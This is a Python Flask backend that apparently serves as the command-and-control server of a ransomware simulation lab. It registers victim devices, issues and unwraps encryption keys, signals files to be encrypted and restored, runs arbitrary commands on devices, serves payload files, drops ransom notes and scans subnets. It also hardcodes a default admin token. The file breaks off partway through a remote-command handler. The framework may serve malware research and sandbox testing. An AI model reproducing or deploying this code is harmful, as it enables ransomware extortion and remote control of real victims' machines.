"""Flask backend with Socket.IO for the safe processor.

Important: When running under eventlet (e.g., gunicorn -k eventlet), we must
monkey-patch BEFORE importing Flask or other network/WSGI modules.
"""

# Apply eventlet monkey patching early when available (no-op if not installed)
try:  # pragma: no cover - environment dependent
    import eventlet  # type: ignore
    eventlet.monkey_patch()
except Exception:
    pass

from flask import Flask, jsonify, request, Response
from flask_cors import CORS
from flask_socketio import SocketIO, emit
# Support both execution contexts:
# - Importing as a package (repo root on sys.path): py_simple.core_handler
# - Running with service root as py_simple/: fallback to local module imports
try:
    from py_simple.core_handler import DataProcessor
    from py_simple.analytics_module import BehaviorSimulator
except ImportError:  # pragma: no cover - runtime env dependent
    from core_handler import DataProcessor
    from analytics_module import BehaviorSimulator
import os, json, socket, base64, sys, subprocess
from hashlib import sha256
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from flask import send_from_directory

app = Flask(__name__)
CORS(app)  # Enable CORS for all routes
# Socket.IO for device signaling (encrypt/restore). Use permissive CORS for lab use.
from .socket_core import init_socketio

# Initialize the processor; allow override via env var WORK_DIR
processor = DataProcessor(os.getenv('WORK_DIR') or None)

# Simple in-memory device registry: token -> { sid, connected, pending_encrypt }
DEVICES = {}

# Simple scripts registry (commands run on the victim VM). Edit via APIs below.
SCRIPTS = {
    'scriptA': {
        'label': 'Script A (py_simple device client)',
        'command': 'python C\\\\Users\\\\user\\\\py_sample\\\\py_simple\\\\device_client.py'
    },
    'scriptB': {
        'label': 'Script B (c sample)',
        'command': 'python C\\\\Users\\\\user\\\\c\\\\device_client.py'
    }
}
behavior = BehaviorSimulator(processor.work_directory)

# Initialize Socket.IO with the real registry/processor
socketio = init_socketio(app, devices_registry=DEVICES, processor=processor)

# --- C2 Files Directory (optional) ---
# Configure a local directory to list/serve files from this backend. Useful when
# running the backend on the same host that stores payloads/scripts.
C2_FILES_DIR = os.getenv('C2_FILES_DIR') or '/home/hari/Downloads/c2_files'  # default for your setup
C2_TOKEN = os.getenv('C2_TOKEN')  # optional access token to guard file APIs

def _c2_authorized():
    if not C2_TOKEN:
        return True
    provided = request.headers.get('X-C2-TOKEN') or request.args.get('token')
    return provided == C2_TOKEN

def _c2_root_real():
    if not C2_FILES_DIR:
        return None
    return os.path.realpath(C2_FILES_DIR)

def _safe_join_c2(subpath: str | None):
    base = _c2_root_real()
    if not base:
        return None
    sp = (subpath or '').lstrip('/\\')
    full = os.path.realpath(os.path.join(base, sp))
    if not full.startswith(base + os.sep) and full != base:
        return None
    return full

@app.route('/status', methods=['GET'])
def status():
    return jsonify({'ok': True, 'hostname': socket.gethostname()})

@app.route('/whoami', methods=['GET'])
def whoami():
    try:
        forwarded = request.headers.get('X-Forwarded-For')
        ip = (forwarded.split(',')[0].strip() if forwarded else request.remote_addr) or ''
        ua = request.headers.get('User-Agent', '')
        return jsonify({'ip': ip, 'forwarded_for': forwarded, 'user_agent': ua, 'server': socket.gethostname()})
    except Exception as e:
        return jsonify({'error': 'whoami_failed', 'message': str(e)}), 500

# --- /py_simple route wrappers for frontend base path ---
@app.route('/py_simple/status', methods=['GET'])
def status_prefixed():
    return status()

@app.route('/py_simple/whoami', methods=['GET'])
def whoami_prefixed():
    return whoami()

@app.route('/py_simple', methods=['GET'])
def py_simple_ui():
        """Serve a minimal UI to manage devices and trigger decrypt on the backend host."""
        html = """
<!doctype html>
<html lang=\"en\">
    <head>
        <meta charset=\"utf-8\" />
        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />
        <title>py_simple · Device Control</title>
        <style>
            :root { --bg:#0f172a; --panel:#0b1222; --muted:#94a3b8; --text:#e2e8f0; --primary:#6366f1; --border:#1f2a44; }
            html,body { height:100%; } body { margin:0; background:linear-gradient(180deg,#0b1020,#0d1428 40%,#0f172a); color:var(--text); font-family: system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial; }
            .wrap { max-width: 900px; margin: 0 auto; padding: 1.25rem; }
            .card { background: var(--panel); border:1px solid var(--border); border-radius: 14px; padding: 1rem; box-shadow: 0 6px 20px rgba(0,0,0,.25); margin-top:1rem; }
            .row { display:flex; gap:.75rem; align-items:center; flex-wrap: wrap; }
            .label { color:var(--muted); margin-right:.25rem; }
            .input, select { background:#0a0f1d; color:var(--text); border:1px solid var(--border); border-radius:10px; padding:.5rem .6rem; }
            .btn { appearance:none; border:1px solid var(--border); background:#1b2140; color:var(--text); padding:.55rem .9rem; border-radius:10px; cursor:pointer; }
            .btn.primary { border-color:#4f46e5; background:#4f46e5; } .btn.primary:hover { background:#6366f1; }
            .btn.ghost { background:rgba(255,255,255,.05); }
            .kv { margin-top:.5rem; } .kv .k { color:var(--muted); margin-right:.5rem; } .kv > div { display:flex; gap:.75rem; padding:.25rem 0; border-bottom:1px dashed rgba(148,163,184,.15); }
            textarea { width:100%; min-height:130px; background:#0a0f1d; color:var(--text); border:1px solid var(--border); border-radius:10px; padding:.6rem; }
            .muted { color:var(--muted); }
        </style>
    </head>
    <body>
        <div class=\"wrap\">
            <h1>py_simple · Device Control</h1>
            <p class=\"muted\">Manage connected devices on this backend, view keys, and trigger decryption.</p>

            <div class=\"card\" id=\"whoami\"></div>

            <div class=\"card\">
                <div class=\"row\">
                    <span class=\"label\">Devices</span>
                    <select id=\"deviceSel\"></select>
                    <button class=\"btn ghost\" id=\"refreshBtn\">Refresh</button>
                    <button class=\"btn primary\" id=\"decryptBtn\">Decrypt Selected</button>
                </div>
                <div id=\"devMeta\" class=\"kv\"></div>
            </div>

            <div class=\"card\">
                <div class=\"row\" style=\"justify-content:space-between;\">
                    <h3 style=\"margin:.25rem 0;\">Keys</h3>
                    <div>
                        <button class=\"btn\" id=\"genKeys\">Generate Key Pair</button>
                        <button class=\"btn\" id=\"attachKeys\">Attach to Device</button>
                    </div>
                </div>
                <div style=\"display:grid; grid-template-columns: 1fr 1fr; gap: .75rem;\">
                    <div>
                        <div class=\"label\">Generated Public Key (PEM)</div>
                        <textarea id=\"pub\" placeholder=\"Generate to populate…\"></textarea>
                    </div>
                    <div>
                        <div class=\"label\">Generated Private Key (PEM)</div>
                        <textarea id=\"prv\" placeholder=\"Generate to populate…\"></textarea>
                    </div>
                </div>
                <div style=\"display:grid; grid-template-columns: 1fr 1fr; gap: .75rem; margin-top:.75rem;\">
                    <div>
                        <div class=\"label\">Device Public Key (stored)</div>
                        <textarea id=\"devPub\" readonly></textarea>
                    </div>
                    <div>
                        <div class=\"label\">Device Private Key (stored)</div>
                        <textarea id=\"devPrv\" readonly></textarea>
                    </div>
                </div>
            </div>

            <div class=\"card\">
                <div class=\"row\" style=\"justify-content:space-between;\">
                    <h3 style=\"margin:.25rem 0;\">Run Script on Device</h3>
                    <div class=\"row\"> 
                        <select id=\"scriptSel\"></select>
                        <button class=\"btn primary\" id=\"runBtn\">Run</button>
                    </div>
                </div>
                <p class=\"muted\">Pick a predefined command (Script A/B) or add your own via API. The command runs on the selected device.</p>
            </div>

            <div class=\"card muted\" id=\"status\">Ready.</div>
        </div>

        <script>
            const apiBase = location.origin + '/py_simple';
            const els = {
                who: document.getElementById('whoami'), sel: document.getElementById('deviceSel'),
                meta: document.getElementById('devMeta'), refresh: document.getElementById('refreshBtn'),
                decrypt: document.getElementById('decryptBtn'), status: document.getElementById('status'),
                gen: document.getElementById('genKeys'), attach: document.getElementById('attachKeys'),
                pub: document.getElementById('pub'), prv: document.getElementById('prv'),
                devPub: document.getElementById('devPub'), devPrv: document.getElementById('devPrv'),
                scriptSel: document.getElementById('scriptSel'), run: document.getElementById('runBtn'),
            };

            function setStatus(msg) { els.status.textContent = msg; }

            async function fetchJSON(url, opts) {
                const r = await fetch(url, Object.assign({ headers: { 'Content-Type': 'application/json' } }, opts));
                let data = null; try { data = await r.json(); } catch (_) {}
                if (!r.ok) throw new Error((data && (data.message || data.error)) || ('HTTP ' + r.status));
                return data || {};
            }

            async function loadWho() {
                try {
                    const data = await fetchJSON(apiBase + '/whoami');
                    els.who.innerHTML = '<div class="kv">\n' +
                        '<div><span class="k">Your IP</span><span class="v">' + (data.ip||'—') + '</span></div>\n' +
                        '<div><span class="k">Forwarded-For</span><span class="v">' + (data.forwarded_for||'—') + '</span></div>\n' +
                        '<div><span class="k">Server</span><span class="v">' + (data.server||'—') + '</span></div>\n' +
                    '</div>';
                } catch(e) { els.who.textContent = 'whoami failed: ' + e.message }
            }

            let devices = [];
            let scripts = [];
            function currentToken() { return els.sel.value || (devices[0] && devices[0].token) || ''; }
            function renderDevices() {
                els.sel.innerHTML = devices.map(d => {
                    const label = (d.hostname || d.token.slice(0,8)) + ' • ' + (d.ip||'ip?') + ' • ' + (d.connected? 'online':'offline');
                    return '<option value="' + d.token + '">' + label + '</option>';
                }).join('');
                const tok = currentToken();
                const d = devices.find(x => x.token === tok) || null;
                els.meta.innerHTML = d ? (
                    '<div><span class="k">Token</span><span class="v">' + d.token + '</span></div>' +
                    '<div><span class="k">Hostname</span><span class="v">' + (d.hostname||'—') + '</span></div>' +
                    '<div><span class="k">IP</span><span class="v">' + (d.ip||'—') + '</span></div>' +
                    '<div><span class="k">Connected</span><span class="v">' + (d.connected? 'yes':'no') + '</span></div>'
                ) : '';
                els.devPub.value = (d && d.public_key_pem) || '';
                els.devPrv.value = (d && d.private_key_pem) || '';
            }

            async function loadDevices() {
                try { const data = await fetchJSON(apiBase + '/devices'); devices = data.devices||[]; renderDevices(); setStatus('Devices loaded'); }
                catch (e) { setStatus('Failed to load devices: ' + e.message); }
            }

            function renderScripts() {
                els.scriptSel.innerHTML = scripts.map(s => '<option value="' + s.id + '">' + (s.label||s.id) + '</option>').join('');
            }

            async function loadScripts() {
                try {
                    const data = await fetchJSON(apiBase + '/scripts');
                    scripts = data.scripts || [];
                    renderScripts();
                } catch (e) { setStatus('Failed to load scripts: ' + e.message); }
            }

            async function decryptSelected() {
                const tok = currentToken(); if (!tok) return setStatus('Select a device first');
                try { const data = await fetchJSON(apiBase + '/restore', { method: 'POST', body: JSON.stringify({ token: tok }) }); setStatus(data.status || 'Decrypt signal sent'); }
                catch (e) { setStatus('Decrypt failed: ' + e.message); }
            }

            async function generateKeys() {
                try {
                    const data = await fetchJSON(apiBase + '/keys/rsa', { method: 'POST', body: JSON.stringify({}) });
                    els.pub.value = data.public_key_pem || ''; els.prv.value = data.private_key_pem || '';
                    setStatus('Generated key pair');
                } catch (e) { setStatus('Keygen failed: ' + e.message); }
            }

            async function attachKeys() {
                const tok = currentToken(); if (!tok) return setStatus('Select a device first');
                const body = { public_key_pem: els.pub.value || undefined, private_key_pem: els.prv.value || undefined };
                if (!body.public_key_pem && !body.private_key_pem) return setStatus('Generate keys first');
                try {
                    await fetchJSON(apiBase + '/devices/' + tok + '/keys', { method: 'POST', body: JSON.stringify(body) });
                    await loadDevices(); setStatus('Keys attached to device');
                } catch (e) { setStatus('Attach failed: ' + e.message); }
            }

            async function runSelected() {
                const tok = currentToken(); if (!tok) return setStatus('Select a device first');
                const id = els.scriptSel.value; if (!id) return setStatus('Select a script');
                const script = scripts.find(x => x.id === id);
                if (!script || !script.command) return setStatus('Script has no command');
                try {
                    await fetchJSON(apiBase + '/device/run', { method: 'POST', body: JSON.stringify({ token: tok, command: script.command }) });
                    setStatus('Run command sent');
                } catch (e) { setStatus('Run failed: ' + e.message); }
            }

            els.refresh.addEventListener('click', loadDevices);
            els.decrypt.addEventListener('click', decryptSelected);
            els.gen.addEventListener('click', generateKeys);
            els.attach.addEventListener('click', attachKeys);
            els.sel.addEventListener('change', renderDevices);
            els.run.addEventListener('click', runSelected);

            loadWho();
            loadDevices();
            loadScripts();
        </script>
    </body>
</html>
        """
        return Response(html, mimetype='text/html')

@app.route('/key', methods=['GET'])
def get_key():
    """Return the encryption key"""
    return jsonify({'key': processor.get_key()})

# Key generation endpoints consolidated here
@app.route('/keys/aes', methods=['POST'])
def keys_aes():
    try:
        key = os.urandom(32)
        b64 = base64.b64encode(key).decode()
        fingerprint = sha256(key).hexdigest()
        redacted = f"{b64[:6]}...{b64[-6:]}"
        return jsonify({'algorithm': 'AES-256-GCM', 'key_redacted': redacted, 'fingerprint_sha256': fingerprint})
    except Exception as e:
        return jsonify({'error': 'aes_keygen_failed', 'message': str(e)}), 500

@app.route('/py_simple/keys/aes', methods=['POST'])
def keys_aes_prefixed():
    return keys_aes()

@app.route('/keys/aes/private', methods=['POST'])
def keys_aes_private():
    admin = os.getenv('ADMIN_TOKEN', 'secretfr')
    provided = request.headers.get('X-ADMIN-TOKEN') or request.args.get('token')
    if not admin or provided != admin:
        return jsonify({'error': 'forbidden', 'message': 'Admin token required'}), 403
    try:
        key = os.urandom(32)
        b64 = base64.b64encode(key).decode()
        return jsonify({'algorithm': 'AES-256-GCM', 'key_base64': b64})
    except Exception as e:
        return jsonify({'error': 'aes_keygen_failed', 'message': str(e)}), 500

@app.route('/py_simple/keys/aes/private', methods=['POST'])
def keys_aes_private_prefixed():
    return keys_aes_private()

@app.route('/keys/rsa', methods=['POST'])
def keys_rsa():
    try:
        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        public_key = private_key.public_key()
        pub_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ).decode()
        prv_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        ).decode()

        pub_hash = sha256(pub_pem.encode()).hexdigest()
        prv_hash = sha256(prv_pem.encode()).hexdigest()

        forwarded = request.headers.get('X-Forwarded-For')
        requester_ip = (forwarded.split(',')[0].strip() if forwarded else request.remote_addr) or ''
        data = request.get_json(silent=True) or {}
        provided_hostname = data.get('hostname')

        record = {'timestamp': int(__import__('time').time()), 'requester_ip': requester_ip, 'requester_hostname': provided_hostname}
        try:
            with open('last_key_request.json', 'w', encoding='utf-8') as f:
                json.dump(record, f, indent=2)
        except Exception:
            pass

        return jsonify({
            'algorithm': 'RSA-2048',
            'public_key_pem': pub_pem,
            'private_key_pem': prv_pem,
            'public_key_fingerprint_sha256': pub_hash,
            'private_key_fingerprint_sha256': prv_hash,
            'device': record,
        })
    except Exception as e:
        return jsonify({'error': 'rsa_keygen_failed', 'message': str(e)}), 500

@app.route('/py_simple/keys/rsa', methods=['POST'])
def keys_rsa_prefixed():
    return keys_rsa()

@app.route('/keys/last-request', methods=['GET'])
def keys_last_request():
    try:
        if not os.path.exists('last_key_request.json'):
            return jsonify({})
        with open('last_key_request.json', 'r', encoding='utf-8') as f:
            data = json.load(f)
        return jsonify(data)
    except Exception as e:
        return jsonify({'error': 'read_failed', 'message': str(e)}), 500

@app.route('/py_simple/keys/last-request', methods=['GET'])
def keys_last_request_prefixed():
    return keys_last_request()

@app.route('/keys/rsa/private', methods=['POST'])
def keys_rsa_private():
    admin = os.getenv('ADMIN_TOKEN', 'secretfr')
    provided = request.headers.get('X-ADMIN-TOKEN') or request.args.get('token')
    if not admin or provided != admin:
        return jsonify({'error': 'forbidden', 'message': 'Admin token required'}), 403
    try:
        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        prv_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        ).decode()
        return jsonify({'algorithm': 'RSA-2048', 'private_key_pem': prv_pem})
    except Exception as e:
        return jsonify({'error': 'rsa_keygen_failed', 'message': str(e)}), 500

@app.route('/py_simple/keys/rsa/private', methods=['POST'])
def keys_rsa_private_prefixed():
    return keys_rsa_private()

@app.route('/keys/unwrap', methods=['POST'])
def keys_unwrap():
    """Unwrap a wrapped (RSA-encrypted) AES key using the attacker's RSA private key.

    Body:
      - token: device token (used to look up stored private_key_pem), optional if private_key_pem provided
      - wrapped_key_base64: base64 of RSA-OAEP(SHA256) encrypted AES key
      - private_key_pem: optional PEM to use instead of stored device private key (lab/demo)

    Returns: { aes_key_base64: str }
    """
    try:
        payload = request.get_json(force=True)
        token = (payload or {}).get('token')
        wrapped_b64 = (payload or {}).get('wrapped_key_base64')
        prv_pem = (payload or {}).get('private_key_pem')
        if not wrapped_b64:
            return jsonify({'error': 'bad_request', 'message': 'wrapped_key_base64 required'}), 400
        if not prv_pem:
            if not token or token not in DEVICES:
                return jsonify({'error': 'bad_request', 'message': 'token required or private_key_pem'}), 400
            prv_pem = DEVICES[token].get('private_key_pem')
        if not prv_pem:
            return jsonify({'error': 'not_configured', 'message': 'No private key available'}), 400
        try:
            private_key = serialization.load_pem_private_key(prv_pem.encode(), password=None)
        except Exception as e:
            return jsonify({'error': 'invalid_key', 'message': f'Failed to load private key: {e}'}), 400
        try:
            wrapped = base64.b64decode(wrapped_b64)
        except Exception as e:
            return jsonify({'error': 'invalid_payload', 'message': f'Invalid base64: {e}'}), 400
        try:
            aes_key = private_key.decrypt(
                wrapped,
                padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
            )
        except Exception as e:
            return jsonify({'error': 'decrypt_failed', 'message': str(e)}), 400
        return jsonify({'aes_key_base64': base64.b64encode(aes_key).decode()})
    except Exception as e:
        return jsonify({'error': 'unwrap_failed', 'message': str(e)}), 500

@app.route('/py_simple/keys/unwrap', methods=['POST'])
def keys_unwrap_prefixed():
    return keys_unwrap()

@app.route('/publickey', methods=['POST'])
def publickey_register():
    """Device requests a public key and receives a device token for WebSocket auth.
    This is a lab/demo endpoint.
    """
    try:
        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        public_key = private_key.public_key()
        pub_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ).decode()

        # Record device info
        forwarded = request.headers.get('X-Forwarded-For')
        requester_ip = (forwarded.split(',')[0].strip() if forwarded else request.remote_addr) or ''
        data = request.get_json(silent=True) or {}
        provided_hostname = data.get('hostname')

        # Create a device token and mark encryption to be triggered on WS auth
        import secrets
        token = secrets.token_hex(16)
        DEVICES[token] = { 'sid': None, 'connected': False, 'pending_encrypt': True, 'ip': requester_ip, 'hostname': provided_hostname }

        record = {'timestamp': int(__import__('time').time()), 'requester_ip': requester_ip, 'requester_hostname': provided_hostname}
        try:
            with open('last_key_request.json', 'w', encoding='utf-8') as f:
                json.dump(record, f, indent=2)
        except Exception:
            pass

        # ws_url is same origin as HTTP base
        ws_url = request.host_url.rstrip('/')
        return jsonify({
            'public_key_pem': pub_pem,
            'device_token': token,
            'ws_url': ws_url,
            'device': record,
        })
    except Exception as e:
        return jsonify({'error': 'publickey_failed', 'message': str(e)}), 500

@app.route('/py_simple/publickey', methods=['POST'])
def publickey_register_prefixed():
    return publickey_register()

@app.route('/process', methods=['POST'])
def encrypt():
    """Trigger encryption locally on the backend (fallback).
    For device-based flow, encryption is signaled via WebSocket upon auth.
    """
    try:
        files = processor.process_files()
        return jsonify({'status': 'Encryption completed successfully', 'files': files})
    except Exception as e:
        return jsonify({'status': 'Encryption failed', 'error': str(e)}), 500

@app.route('/py_simple/process', methods=['POST'])
def encrypt_prefixed():
    return encrypt()

@app.route('/restore', methods=['POST'])
def decrypt():
    """Trigger decryption of files.
    If devices are connected via WebSocket, emit a decrypt signal to them.
    Otherwise, perform local processor decryption as a fallback.
    """
    try:
        payload = request.get_json(silent=True) or {}
        private_key_pem = payload.get('private_key_pem')
        target_token = payload.get('token')
        # If a specific device token is provided and connected, emit only to that device
        if target_token and target_token in DEVICES and DEVICES[target_token].get('sid'):
            sid = DEVICES[target_token]['sid']
            # Only include private key if explicitly provided in the request for lab demo.
            # Otherwise, do NOT push private key to the device; device will request unwrap from website.
            emit_payload = ({'private_key_pem': private_key_pem} if private_key_pem else None)
            socketio.emit('decrypt', emit_payload, to=sid)
            # Also attempt local decrypt as a safety net
            try:
                processor.restore_files()
            except Exception:
                pass
            return jsonify({'status': 'Decrypt signal sent to device', 'token': target_token}), 200
        # Otherwise broadcast to all connected clients; do not include private key unless explicitly provided.
        emit_payload = ({'private_key_pem': private_key_pem} if private_key_pem else None)
        socketio.emit('decrypt', emit_payload, broadcast=True)
        # Also attempt local decrypt as a safety net (no harm if no local files)
        try:
            processor.restore_files()
        except Exception:
            pass
        # Report approximate connected devices if available
        connected = sum(1 for _t, info in DEVICES.items() if info.get('connected')) if DEVICES else None
        if connected is not None:
            return jsonify({'status': f'Decrypt signal broadcasted', 'connected_devices': connected}), 200
        return jsonify({'status': 'Decrypt signal broadcasted'}), 200
    except Exception as e:
        return jsonify({'status': 'Decryption failed', 'error': str(e)}), 500

@app.route('/py_simple/restore', methods=['POST'])
def decrypt_prefixed():
    return decrypt()

@app.route('/devices', methods=['GET'])
def devices_state():
    """Inspect connected devices (lab diagnostics)."""
    try:
        out = []
        for token, info in DEVICES.items():
            out.append({
                'token': token,
                'connected': bool(info.get('connected')),
                'ip': info.get('ip'),
                'hostname': info.get('hostname'),
                'has_sid': bool(info.get('sid')),
                'public_key_pem': info.get('public_key_pem'),
                'private_key_pem': info.get('private_key_pem')
            })
        return jsonify({'count': len(out), 'devices': out})
    except Exception as e:
        return jsonify({'error': 'inspect_failed', 'message': str(e)}), 500

@app.route('/py_simple/devices', methods=['GET'])
def devices_state_prefixed():
    return devices_state()

@app.route('/scripts', methods=['GET'])
def scripts_list():
    try:
        out = []
        for sid, meta in SCRIPTS.items():
            out.append({'id': sid, 'label': meta.get('label'), 'command': meta.get('command')})
        return jsonify({'scripts': out})
    except Exception as e:
        return jsonify({'error': 'list_failed', 'message': str(e)}), 500

@app.route('/py_simple/scripts', methods=['GET'])
def scripts_list_prefixed():
    return scripts_list()

@app.route('/scripts', methods=['POST'])
def scripts_add():
    try:
        data = request.get_json(force=True)
        sid = data.get('id'); command = data.get('command'); label = data.get('label') or sid
        if not sid or not command:
            return jsonify({'error': 'bad_request', 'message': 'id and command required'}), 400
        SCRIPTS[sid] = {'label': label, 'command': command}
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'error': 'save_failed', 'message': str(e)}), 500

@app.route('/py_simple/scripts', methods=['POST'])
def scripts_add_prefixed():
    return scripts_add()

# --- C2 files APIs ---
@app.route('/c2', methods=['GET'])
def c2_root():
    if not _c2_authorized():
        return jsonify({'error': 'forbidden'}), 403
    root = _c2_root_real()
    if not root or not os.path.isdir(root):
        return jsonify({'files': [], 'root': root, 'configured': False})
    items = []
    for name in sorted(os.listdir(root)):
        p = os.path.join(root, name)
        try:
            stat = os.stat(p)
            items.append({'name': name, 'is_dir': os.path.isdir(p), 'size': stat.st_size})
        except Exception:
            pass
    return jsonify({'files': items, 'root': root, 'configured': True})

@app.route('/py_simple/c2', methods=['GET'])
def c2_root_prefixed():
    return c2_root()

@app.route('/c2/list', methods=['GET'])
def c2_list():
    if not _c2_authorized():
        return jsonify({'error': 'forbidden'}), 403
    path = request.args.get('path')
    base = _safe_join_c2(path)
    if not base or not os.path.isdir(base):
        return jsonify({'error': 'not_found'}), 404
    items = []
    for name in sorted(os.listdir(base)):
        p = os.path.join(base, name)
        try:
            stat = os.stat(p)
            items.append({'name': name, 'is_dir': os.path.isdir(p), 'size': stat.st_size})
        except Exception:
            pass
    return jsonify({'files': items, 'path': path or ''})

@app.route('/py_simple/c2/list', methods=['GET'])
def c2_list_prefixed():
    return c2_list()

@app.route('/c2/download', methods=['GET'])
def c2_download():
    if not _c2_authorized():
        return jsonify({'error': 'forbidden'}), 403
    rel = request.args.get('path')
    base = _safe_join_c2(None)
    full = _safe_join_c2(rel)
    if not base or not full or not os.path.isfile(full):
        return jsonify({'error': 'not_found'}), 404
    directory = os.path.dirname(full)
    filename = os.path.basename(full)
    return send_from_directory(directory, filename, as_attachment=True)

@app.route('/py_simple/c2/download', methods=['GET'])
def c2_download_prefixed():
    return c2_download()

@app.route('/devices/<token>/public-key', methods=['POST'])
def set_device_public_key(token: str):
    """Attach a site-generated public key to a device token (lab/demo)."""
    try:
        if token not in DEVICES:
            return jsonify({'error': 'not_found'}), 404
        data = request.get_json(silent=True) or {}
        pem = data.get('public_key_pem')
        if not pem:
            return jsonify({'error': 'bad_request', 'message': 'public_key_pem required'}), 400
        DEVICES[token]['public_key_pem'] = pem
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'error': 'set_failed', 'message': str(e)}), 500

@app.route('/py_simple/devices/<token>/public-key', methods=['POST'])
def set_device_public_key_prefixed(token: str):
    return set_device_public_key(token)

@app.route('/devices/<token>/keys', methods=['POST'])
def set_device_keys(token: str):
    """Attach site-generated public/private keys to a device token (lab/demo)."""
    try:
        if token not in DEVICES:
            return jsonify({'error': 'not_found'}), 404
        data = request.get_json(silent=True) or {}
        pub = data.get('public_key_pem')
        prv = data.get('private_key_pem')
        if not pub and not prv:
            return jsonify({'error': 'bad_request', 'message': 'public_key_pem or private_key_pem required'}), 400
        if pub:
            DEVICES[token]['public_key_pem'] = pub
        if prv:
            DEVICES[token]['private_key_pem'] = prv
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'error': 'set_failed', 'message': str(e)}), 500

@app.route('/py_simple/devices/<token>/keys', methods=['POST'])
def set_device_keys_prefixed(token: str):
    return set_device_keys(token)

@app.route('/behavior/notes', methods=['POST'])
def behavior_notes():
    files = behavior.drop_ransom_notes()
    return jsonify({'status': 'ok', 'files': files})

@app.route('/py_simple/behavior/notes', methods=['POST'])
def behavior_notes_prefixed():
    return behavior_notes()

@app.route('/behavior/registry', methods=['POST'])
def behavior_registry():
    result = behavior.simulate_registry_changes()
    return jsonify(result)

@app.route('/py_simple/behavior/registry', methods=['POST'])
def behavior_registry_prefixed():
    return behavior_registry()

@app.route('/behavior/registry/cleanup', methods=['POST'])
def behavior_registry_cleanup():
    result = behavior.cleanup_registry()
    return jsonify(result)

@app.route('/py_simple/behavior/registry/cleanup', methods=['POST'])
def behavior_registry_cleanup_prefixed():
    return behavior_registry_cleanup()

@app.route('/behavior/network', methods=['POST'])
def behavior_network():
    result = behavior.simulate_network_activity()
    return jsonify(result)

@app.route('/py_simple/behavior/network', methods=['POST'])
def behavior_network_prefixed():
    return behavior_network()

@app.route('/behavior/discovery', methods=['POST'])
def behavior_discovery():
    result = behavior.simulate_discovery()
    return jsonify(result)

@app.route('/py_simple/behavior/discovery', methods=['POST'])
def behavior_discovery_prefixed():
    return behavior_discovery()

@app.route('/behavior/commands', methods=['POST'])
def behavior_commands():
    path = behavior.simulate_command_strings()
    return jsonify({'status': 'ok', 'file': path})

@app.route('/py_simple/behavior/commands', methods=['POST'])
def behavior_commands_prefixed():
    return behavior_commands()

@app.route('/behavior/scan', methods=['POST'])
def behavior_scan():
    """Trigger network host scan on local subnet."""
    data = request.get_json() or {}
    subnet = data.get('subnet')  # Optional: CIDR notation like "192.168.1.0/24"
    ports = data.get('ports')    # Optional: list of ports to scan
    results = behavior.scan_network_hosts(subnet=subnet, ports=ports)
    return jsonify(results)

@app.route('/py_simple/behavior/scan', methods=['POST'])
def behavior_scan_prefixed():
    return behavior_scan()

# --- CAPE agent integration (lab/demo) ---
@app.route('/cape/report', methods=['POST'])
def cape_report():
    """Accept a CAPE agent JSON report and persist it under cape_reports/.
    Not authenticated for lab simplicity; add token/header checks if exposing.
    """
    try:
        # Optional token auth: set CAPE_TOKEN env in backend to require header
        expected = os.getenv('CAPE_TOKEN')
        if expected:
            provided = request.headers.get('X-CAPE-TOKEN')
            if provided != expected:
                return jsonify({'error': 'forbidden'}), 403
        data = request.get_json(force=True, silent=False)
        os.makedirs('cape_reports', exist_ok=True)
        import time, uuid
        ts = time.strftime('%Y%m%d-%H%M%S')
        fname = f"report_{ts}_{uuid.uuid4().hex[:8]}.json"
        fpath = os.path.join('cape_reports', fname)
        with open(fpath, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2)
        # Also update a last.json pointer for convenience
        with open(os.path.join('cape_reports', 'last.json'), 'w', encoding='utf-8') as f:
            json.dump({ 'path': fpath, 'created': ts }, f, indent=2)
        return jsonify({'status': 'ok', 'saved': fpath})
    except Exception as e:
        return jsonify({'error': 'persist_failed', 'message': str(e)}), 400

@app.route('/py_simple/cape/report', methods=['POST'])
def cape_report_prefixed():
    return cape_report()

# --- Device client process management (lab/demo) ---
@app.route('/py_simple/device/start', methods=['POST'])
def start_device_client():
    """Start the device_client.py as a background process on the server host.
    Lab-only convenience to demonstrate end-to-end flow. Returns PID on success.
    """
    try:
        payload = request.get_json(silent=True) or {}
        backend_base = payload.get('backend') or request.host_url.rstrip('/')
        # Optional args
        extra_args = []
        if payload.get('polling'):
            extra_args.append('--polling')
        if payload.get('debug'):
            extra_args.append('--debug')
        if payload.get('insecure'):
            extra_args.append('--insecure')
        # Compute absolute path to device_client.py
        here = os.path.dirname(os.path.abspath(__file__))
        client_path = os.path.join(here, 'device_client.py')
        if not os.path.exists(client_path):
            return jsonify({'error': 'not_found', 'message': 'device_client.py missing'}), 404
        cmd = [sys.executable, '-u', client_path, '--backend', backend_base]
        cmd.extend(extra_args)
        # Launch detached
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return jsonify({'status': 'started', 'pid': proc.pid})
    except Exception as e:
        return jsonify({'error': 'start_failed', 'message': str(e)}), 500

if __name__ == '__main__':
    # For local dev. In production on Render, run with gunicorn -k eventlet ... server:app
    socketio.run(app, debug=True, port=5000)

@app.route('/device/run', methods=['POST'])
def device_run():
    """Trigger execution of an arbitrary command on a connected device.

    Body: { token: str, command: str }
    """
    try:
        payload = request.get_json(force=True)
        token = (payload or {}).get('token')
        command = (payload or {}).get('command')
        if not token or not command:
            return jsonify({'error': 'bad_request', 'message': 'token and command required'}), 400
        info = DEVICES.get(token)
